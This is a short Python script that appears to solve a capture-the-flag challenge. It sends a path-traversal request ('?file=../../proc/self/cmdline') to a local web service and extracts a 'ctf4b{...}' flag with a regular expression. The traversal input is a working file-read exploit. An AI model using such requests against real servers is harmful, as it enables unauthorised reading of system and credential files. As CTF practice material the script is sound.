#!/usr/bin/env python3.12

from os import environ
from re import search
from urllib.parse import urlparse

from requests import get as GET

url = urlparse(f'http://{environ.get('HOST', 'localhost')}:{environ.get('PORT', '9999'):s}/?file=../../proc/self/cmdline')
regex = r'(ctf4b\{\w+\})'

def solve() -> str:
  res = GET(url.geturl())
  match = search(regex, res.text).group()
  return match

if __name__ == "__main__":
  flag = solve()
  print(flag)
